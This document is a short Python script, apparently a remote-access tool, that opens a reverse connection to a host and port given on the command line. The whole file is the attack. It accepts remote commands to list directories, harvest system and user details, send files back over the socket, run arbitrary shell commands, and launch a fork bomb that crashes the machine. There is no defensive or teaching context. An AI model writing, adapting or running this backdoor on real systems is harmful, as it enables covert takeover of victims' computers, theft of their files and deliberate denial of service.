#!/usr/bin/env python3

import socket
import subprocess
import os
import sys
import platform
import getpass
from time import sleep

I = '\033[1;77m[i] \033[0m'
Q = '\033[1;77m[?] \033[0m'
S = '\033[1;32m[+] \033[0m'
W = '\033[1;33m[!] \033[0m'
E = '\033[1;31m[-] \033[0m'
G = '\033[1;34m[*] \033[0m'

GREEN = '\033[0;33m'
RESET = '\033[0m'

if len(sys.argv) < 3:
    print("Usage: magic_unicorn.py <remote_host> <remote_port>")
    sys.exit()

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        header = f"""({GREEN}{getpass.getuser()}@{platform.node()}{RESET})> """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")
        ui = cmd.strip().split(" ")

        if ui[0] == "list":
            sock.send(str(os.listdir(".")).encode())

        elif ui[0] == "forkbomb":
            while True:
                os.fork()

        elif ui[0] == "cd":
            os.chdir(ui[1])
            sock.send(I+"Changed directory to {}.".format(os.getcwd()).encode())

        elif ui[0] == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        elif ui[0] == "download":
            if len(ui) < 3:
                sock.send("Usage: download <remote_file> <local_path>".encode())
            else:
                with open(ui[1], "rb") as f:
                    file_data = f.read(1024)
                    while file_data:
                        sock.send(file_data)
                        file_data = f.read(1024)
                    sock.send(b"DONE")
                    f.close()

        elif ui[0] == "exit":
            sock.send(b"exit")
            break

        elif ui[0] == "shell":
            if len(ui) < 2:
                sock.send("Usage: shell <command>".encode())
            else:
                comm = subprocess.Popen(str(cmd.split(ui[0])[1]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                if not STDOUT:
                    sock.send(STDERR)
                else:
                    sock.send(STDOUT)

        elif ui[0] == "":
            sock.send("none".encode())

        else:
            sock.send((E+"Unrecognized command!").encode())

        if not cmd:
            break
    except Exception as e:
        sock.send((E+"An error has occured: {}".format(str(e))).encode())
        
sock.close()
